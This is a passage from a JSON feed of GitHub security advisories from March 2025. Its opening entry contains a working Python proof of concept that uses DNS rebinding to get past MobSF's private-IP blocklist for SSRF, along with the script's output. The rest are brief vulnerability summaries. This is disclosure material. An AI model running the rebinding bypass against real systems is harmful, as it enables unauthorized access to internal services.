'100.64.',\n            '127.',\n            '192.',\n            '198.',\n            '10.',\n            '172.',\n            '169.',\n            '0.',\n            '203.0.',\n            '224.0.',\n            '240.0',\n            '255.255.',\n            'localhost',\n            '::1',\n            '64::ff9b::',\n            '100::',\n            '2001::',\n            '2002::',\n            'fc00::',\n            'fe80::',\n            'ff00::')\n        if domain.startswith(invalid_prefix):\n            return False, None\n        ip = socket.gethostbyname(domain)\n        if ip.startswith(invalid_prefix):\n            # Resolve dns to get IP\n            return False, None\n        return True, ip\n    except Exception:\n        return False, None\n\nimport random\nimport time\nimport socket\nfrom urllib.parse import urlparse\n\nif __name__ == '__main__':\n    print(\"Generating random host ...\", end=' ')     \n    prefix = random.randint(999_999, 9_999_999)\n    host = f\"{prefix}-make-1.1.1.1-rebindfor30safter1times-127.0.0.1-rr.1u.ms\"\n    print(\"Done\")\n    print(f\"Testing with '{host}' ... \", end=\" \")\n    valid, ip = valid_host(host)\n    if valid:\n        print(f\"Successful Bypass\")\n        print(f\" - Host initially resolved to: {ip}\")\n        print(\"Sleeping for 1 second ...\")\n        time.sleep(1)\n        print(f\" - Second use host will be resolved to: {socket.gethostbyname(host)}\")\n        print(f\" - Third use host will be resolved to: {socket.gethostbyname(host)}\")\n        print(\"Sleeping for 30 seconds ...\")\n        time.sleep(30)\n    else:\n        print(f\"Invalid host\")\n</code></pre>\n<p>Yields : </p>\n<pre><code>$ python3 poc.py\nGenerating random host ... Done\nTesting with '5084216-make-1.1.1.1-rebindfor30safter1times-127.0.0.1-rr.1u.ms' ...  Successful Bypass\n - Host initially resolved to: 1.1.1.1\nSleeping for 1 second ...\n - Second use host will be resolved to: 127.0.0.1\n - Third use host will be resolved to: 127.0.0.1\nSleeping for 30 seconds ...\n</code></pre>\n<p>Which generate an initlal random url that leverages dns rebinding after 1 time host resolution and remains to that IP for 30 seconds.\nAs you can notice the initial resolution was pointing to <code>1.1.1.1</code>. The second time the IP was resolved to <code>127.0.0.1</code>. Such an attack could be adjusted for other IP addresses.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>The usual impact of Server-side request forgery.</p>\n<h3 id=\"remediation\">Remediation</h3>\n<ul>\n<li>Avoid the use of <code>socket.gethostbyname()</code> since it issues and DNS query.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-fcfq-m8p6-gw56\">https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-fcfq-m8p6-gw56</a></li>\n<li><a href=\"https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/4b8bab5a9858c69fe13be4631b82d82186e0d3bd\">https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/4b8bab5a9858c69fe13be4631b82d82186e0d3bd</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-31116\">https://nvd.nist.gov/vuln/detail/CVE-2025-31116</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fcfq-m8p6-gw56\">https://github.com/advisories/GHSA-fcfq-m8p6-gw56</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fcfq-m8p6-gw56",
            "title": "[mobsf] Mobile Security Framework (MobSF) has a SSRF Vulnerability fix bypass on assetlinks_check with DNS Rebinding",
            "date_modified": "2025-03-31T23:32:37.000Z",
            "date_published": "2025-03-31T17:23:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fcfq-m8p6-gw56"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>From @jackfromeast and @superboy-zjc:\nWe have identified a class pollution vulnerability in Mesop (&lt;= <a href=\"https://github.com/mesop-dev/mesop/releases/tag/v0.14.0\">0.14.0</a>) application that allows attackers to overwrite global variables and class attributes in certain Mesop modules during runtime. This vulnerability could directly lead to a denial of service (DoS) attack against the server. Additionally, it could also result in other severe consequences given the application's implementation, such as identity confusion, where an attacker could impersonate an assistant or system role within conversations. This impersonation could potentially enable jailbreak attacks when interacting with large language models (LLMs).</p>\n<p>Just like the Javascript's prototype pollution, this vulnerability could leave a way for attackers to manipulate the intended data-flow or control-flow of the application at runtime and lead to severe consequnces like RCE when gadgets are available.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mesop-dev/mesop/security/advisories/GHSA-f3mf-hm6v-jfhh\">https://github.com/mesop-dev/mesop/security/advisories/GHSA-f3mf-hm6v-jfhh</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30358\">https://nvd.nist.gov/vuln/detail/CVE-2025-30358</a></li>\n<li><a href=\"https://github.com/mesop-dev/mesop/commit/748e20d4a363d89b841d62213f5b0c6b4bed788f\">https://github.com/mesop-dev/mesop/commit/748e20d4a363d89b841d62213f5b0c6b4bed788f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f3mf-hm6v-jfhh\">https://github.com/advisories/GHSA-f3mf-hm6v-jfhh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f3mf-hm6v-jfhh",
            "title": "[mesop] Mesop Class Pollution vulnerability leads to DoS and Jailbreak attacks",
            "date_modified": "2025-03-27T18:14:30.000Z",
            "date_published": "2025-03-27T18:14:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f3mf-hm6v-jfhh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A malicious server can craft events which, when received, prevent Synapse version up to 1.127.0 from federating with other servers. The vulnerability has been exploited in the wild.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Fixed in Synapse v1.127.1.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Closed federation environments of trusted servers or non-federating installations are not affected.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory, please email us at <a href=\"mailto:security@element.io\">security at element.io</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/element-hq/synapse/security/advisories/GHSA-v56r-hwv5-mxg6\">https://github.com/element-hq/synapse/security/advisories/GHSA-v56r-hwv5-mxg6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30355\">https://nvd.nist.gov/vuln/detail/CVE-2025-30355</a></li>\n<li><a href=\"https://github.com/element-hq/synapse/commit/2277df2a1eb685f85040ef98fa21d41aa4cdd389\">https://github.com/element-hq/synapse/commit/2277df2a1eb685f85040ef98fa21d41aa4cdd389</a></li>\n<li><a href=\"https://github.com/element-hq/synapse/releases/tag/v1.127.1\">https://github.com/element-hq/synapse/releases/tag/v1.127.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v56r-hwv5-mxg6\">https://github.com/advisories/GHSA-v56r-hwv5-mxg6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v56r-hwv5-mxg6",
            "title": "[matrix-synapse] Synapse vulnerable to federation denial of service via malformed events",
            "date_modified": "2025-03-27T18:02:15.000Z",
            "date_published": "2025-03-27T18:02:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v56r-hwv5-mxg6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>User supplied values passed through to certain attributes in form widgets are not fully escaped for potentially dangerous tokens, and in some cases are rendered in browser as valid html tags.</p>\n<h3 id=\"details\">Details</h3>\n<p>Attributes passed to the widget (such as <code>label_field</code>) containing <code>&lt;</code>, <code>&gt;</code>, and similar tokens are not fully escaped. This results in some raw values reaching the widget, and rendering in part or fully.</p>\n<p>For example, a label of: <code>\"Test User &lt;script&gt;I can pass this to the label_field and it gets rendered&lt;/script&gt;\"</code> is rendered in the choices's label visually as <code>\"Test User \"</code> with the trailing space, and what appears as an un-executed script tag following it (which is visible when viewing source).</p>\n<p>The actual output rendered in the browser for this example is: <code>&lt;div role=\"option\" data-value=\"63f205b6\" class=\"item\" data-ts-item=\"\"&gt;Test User &lt;script&gt;I can pass this to the label_field and it gets rendered&lt;/script&gt;&lt;/div&gt;</code></p>\n<p>The script tags appears to be valid in Chrome dev tools, but doesn't appear execute code.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Although the risk may be mediated since the content within the rendered <code>&lt;script&gt;&lt;/script&gt;</code> tags does not seem to actually/immediately run, potential may exist for other ways of increasing the risk (e.g.: code injection).  In addition, the widget does not display correctly for valid strings containing <code>&lt;</code> or <code>&gt;</code>. Valid use-cases for printing these characters include widget label fields displaying email addresses (e.g.: <code>\"User Jane &lt;user.jane@example.com&gt;\"</code></p>\n<p>Because of the relatively small number of users at this moment, our plan to yank affected releases on PyPI and GitHub, and because raw text is rendered but does not seem to be executable, I am marking the Severity <strong>Low</strong>.</p>\n<p>Update to version <strong>5.3.3</strong>. The only difference from 5.3.2 is the code and documentation changes to resolve this vulnerability, so the update process should not be problematic.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/OmenApps/django-tomselect/security/advisories/GHSA-785h-76cm-cpmf\">https://github.com/OmenApps/django-tomselect/security/advisories/GHSA-785h-76cm-cpmf</a></li>\n<li><a href=\"https://github.com/OmenApps/django-tomselect/commit/0990ed36c8874f9d42fa9deff7734bf8dcd46d40\">https://github.com/OmenApps/django-tomselect/commit/0990ed36c8874f9d42fa9deff7734bf8dcd46d40</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-785h-76cm-cpmf\">https://github.com/advisories/GHSA-785h-76cm-cpmf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-785h-76cm-cpmf",
            "title": "[django-tomselect] Django TomSelect incomplete escaping of dangerous characters in widget attributes",
            "date_modified": "2025-03-26T20:34:03.000Z",
            "date_published": "2025-03-26T20:34:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-785h-76cm-cpmf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>SQL injection could be achieved via a specially crafted request, which could allow malicious person to gain access to sensitive information.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Upgrading is required, no other workaround is present.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/frappe/frappe/security/advisories/GHSA-6phg-4wmq-h5h3\">https://github.com/frappe/frappe/security/advisories/GHSA-6phg-4wmq-h5h3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30217\">https://nvd.nist.gov/vuln/detail/CVE-2025-30217</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6phg-4wmq-h5h3\">https://github.com/advisories/GHSA-6phg-4wmq-h5h3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6phg-4wmq-h5h3",
            "title": "[frappe] Frappe has possibility of SQL injection due to improper validations",
            "date_modified": "2025-03-31T13:12:14.000Z",
            "date_published": "2025-03-26T17:13:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6phg-4wmq-h5h3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>SQL injection could be achieved via a specially crafted request, which could allow malicious person to gain access to sensitive information.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Upgrading is required, no other workaround is present.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/frappe/frappe/security/advisories/GHSA-6phg-4wmq-h5h3\">https://github.com/frappe/frappe/security/advisories/GHSA-6phg-4wmq-h5h3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30217\">https://nvd.nist.gov/vuln/detail/CVE-2025-30217</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6phg-4wmq-h5h3\">https://github.com/advisories/GHSA-6phg-4wmq-h5h3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6phg-4wmq-h5h3",
            "title": "[frappe] Frappe has possibility of SQL injection due to improper validations",
            "date_modified": "2025-03-31T13:12:14.000Z",
            "date_published": "2025-03-26T17:13:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6phg-4wmq-h5h3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A CORS (Cross-Origin Resource Sharing) misconfiguration in prefecthq/prefect prior to version 3.0.3 allows unauthorized domains to access sensitive data. This vulnerability can lead to unauthorized access to the database, resulting in potential data leaks, loss of confidentiality, service disruption, and data integrity risks.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-8183\">https://nvd.nist.gov/vuln/detail/CVE-2024-8183</a></li>\n<li><a href=\"https://github.com/prefecthq/prefect/commit/a69266e077169b8a32ad76b1dd3ea63b96d011c2\">https://github.com/prefecthq/prefect/commit/a69266e077169b8a32ad76b1dd3ea63b96d011c2</a></li>\n<li><a href=\"https://huntr.com/bounties/b801de43-ff9f-4db9-b583-4797d4f7d3d2\">https://huntr.com/bounties/b801de43-ff9f-4db9-b583-4797d4f7d3d2</a></li>\n<li><a href=\"https://github.com/PrefectHQ/prefect/issues/15074\">https://github.com/PrefectHQ/prefect/issues/15074</a></li>\n<li><a href=\"https://github.com/PrefectHQ/prefect/commit/8f159b404126d93964a4daace7619bc553fa318c\">https://github.com/PrefectHQ/prefect/commit/8f159b404126d93964a4daace7619bc553fa318c</a></li>\n<li><a href=\"https://github.com/PrefectHQ/prefect/releases/tag/2.20.17\">https://github.com/PrefectHQ/prefect/releases/tag/2.20.17</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4v9f-r55g-g6hc\">https://github.com/advisories/GHSA-4v9f-r55g-g6hc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4v9f-r55g-g6hc",
            "title": "[prefect] Prefect CORS (Cross-Origin Resource Sharing) misconfiguration",
            "date_modified": "2025-03-26T15:36:24.000Z",
            "date_published": "2025-03-20T12:32:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4v9f-r55g-g6hc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A CORS (Cross-Origin Resource Sharing) misconfiguration in prefecthq/prefect prior to version 3.0.3 allows unauthorized domains to access sensitive data. This vulnerability can lead to unauthorized access to the database, resulting in potential data leaks, loss of confidentiality, service disruption, and data integrity risks.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-8183\">https://nvd.nist.gov/vuln/detail/CVE-2024-8183</a></li>\n<li><a href=\"https://github.com/prefecthq/prefect/commit/a69266e077169b8a32ad76b1dd3ea63b96d011c2\">https://github.com/prefecthq/prefect/commit/a69266e077169b8a32ad76b1dd3ea63b96d011c2</a></li>\n<li><a href=\"https://huntr.com/bounties/b801de43-ff9f-4db9-b583-4797d4f7d3d2\">https://huntr.com/bounties/b801de43-ff9f-4db9-b583-4797d4f7d3d2</a></li>\n<li><a href=\"https://github.com/PrefectHQ/prefect/issues/15074\">https://github.com/PrefectHQ/prefect/issues/15074</a></li>\n<li><a href=\"https://github.com/PrefectHQ/prefect/commit/8f159b404126d93964a4daace7619bc553fa318c\">https://github.com/PrefectHQ/prefect/commit/8f159b404126d93964a4daace7619bc553fa318c</a></li>\n<li><a href=\"https://github.com/PrefectHQ/prefect/releases/tag/2.20.17\">https://github.com/PrefectHQ/prefect/releases/tag/2.20.17</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4v9f-r55g-g6hc\">https://github.com/advisories/GHSA-4v9f-r55g-g6hc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4v9f-r55g-g6hc",
            "title": "[prefect] Prefect CORS (Cross-Origin Resource Sharing) misconfiguration",
            "date_modified": "2025-03-26T15:36:24.000Z",
            "date_published": "2025-03-20T12:32:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4v9f-r55g-g6hc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Making crafted requests could lead to information disclosure that could further lead to account takeover.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There's no workaround to fix this without upgrading.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>Thanks to Thanh of Calif.io for reporting the issue</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/frappe/frappe/security/advisories/GHSA-qrv3-jc3h-f3m6\">https://github.com/frappe/frappe/security/advisories/GHSA-qrv3-jc3h-f3m6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30214\">https://nvd.nist.gov/vuln/detail/CVE-2025-30214</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qrv3-jc3h-f3m6\">https://github.com/advisories/GHSA-qrv3-jc3h-f3m6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qrv3-jc3h-f3m6",
            "title": "[frappe] Frappe vulnerable to information disclosure leading to account takeover",
            "date_modified": "2025-03-30T23:56:12.000Z",
            "date_published": "2025-03-25T16:40:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qrv3-jc3h-f3m6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Making crafted requests could lead to information disclosure that could further lead to account takeover.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There's no workaround to fix this without upgrading.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>Thanks to Thanh of Calif.io for reporting the issue</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/frappe/frappe/security/advisories/GHSA-qrv3-jc3h-f3m6\">https://github.com/frappe/frappe/security/advisories/GHSA-qrv3-jc3h-f3m6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30214\">https://nvd.nist.gov/vuln/detail/CVE-2025-30214</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qrv3-jc3h-f3m6\">https://github.com/advisories/GHSA-qrv3-jc3h-f3m6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qrv3-jc3h-f3m6",
            "title": "[frappe] Frappe vulnerable to information disclosure leading to account takeover",
            "date_modified": "2025-03-30T23:56:12.000Z",
            "date_published": "2025-03-25T16:40:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qrv3-jc3h-f3m6"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}